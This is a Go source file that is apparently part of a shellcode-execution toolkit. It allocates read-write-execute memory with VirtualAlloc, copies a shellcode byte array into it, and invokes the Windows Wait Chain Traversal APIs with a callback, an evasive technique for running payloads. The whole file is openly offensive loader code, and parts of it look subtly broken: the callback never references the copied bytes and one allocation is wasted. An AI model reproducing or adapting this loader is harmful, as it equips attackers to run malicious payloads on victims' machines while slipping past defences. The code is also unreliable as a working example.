package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

type WCT_OBJECT_TYPE uint32

const (
	WctThreadType WCT_OBJECT_TYPE = iota
	WctProcessType
	WctMaxType
)

type WCT_OBJECT_STATUS uint32

const (
	MEM_RESERVE                              = 0x2000
	MEM_COMMIT                               = 0x1000
	PAGE_EXECUTE_READWRITE                   = 0x40
	WCT_ASYNC_OPEN_FLAG                      = 0x1
	WctStatusNoAccess      WCT_OBJECT_STATUS = iota
	WctStatusRunning
	WctStatusBlocked
	WctStatusPidOnly
	WctStatusPidOnlyRpcss
	WctStatusOwned
	WctStatusNotOwned
	WctStatusAbandoned
	WctStatusUnknown
	WctStatusError
	WctStatusMax
)

type WAITCHAIN_NODE_INFO struct {
	ObjectType      WCT_OBJECT_TYPE
	ObjectStatus    WCT_OBJECT_STATUS
	ProcessId       uint32
	ThreadId        uint32
	WaitTime        uint32
	ContextSwitches uint32
}
type WAITCHAINCALLBACK func(context uintptr, count uint32, info []WAITCHAIN_NODE_INFO, isCycleFound bool) uintptr

//export waitChainCallback
func waitChainCallback(context uintptr, count uint32, info *WAITCHAIN_NODE_INFO, isCycleFound bool) uintptr {
	fmt.Printf("Callback called with count: %d\n", count)
	return 0
}

// main function to process op
func Run(op []byte) {
	// Load required Windows libraries
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	advapi32 := syscall.MustLoadDLL("advapi32.dll")

	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// Process op array
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}
	openThreadWaitChainSession := advapi32.MustFindProc("OpenThreadWaitChainSession")
	closeThreadWaitChainSession := advapi32.MustFindProc("CloseThreadWaitChainSession")
	address, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Printf("VirtualAlloc failed with error: %v\n", err)
		return
	}

	// Copy op into the allocated memory
	for i := range op {
		*(*byte)(unsafe.Pointer(address + uintptr(i))) = op[i]
	}

	hWct, _, err := openThreadWaitChainSession.Call(0x01, syscall.NewCallback(func() uintptr {
		fmt.Printf("ssssssssssssss")
		return 0
	}))

	if hWct == 0 {
		log.Fatalf("OpenThreadWaitChainSession failed: %v", err)
	}

	defer closeThreadWaitChainSession.Call(hWct)

	getCurrentThreadWaitChain := advapi32.MustFindProc("GetThreadWaitChain")

	//callback := syscall.NewCallbackCDecl(waitChainCallback)

	ret, _, err := getCurrentThreadWaitChain.Call(hWct, 0, 0x02, 0, 0, 0, 0)
	if ret == 0 {
		log.Fatalf("GetThreadWaitChain failed: %v", err)
	}

}

func main() {
	Run(util.ShellCode())
}
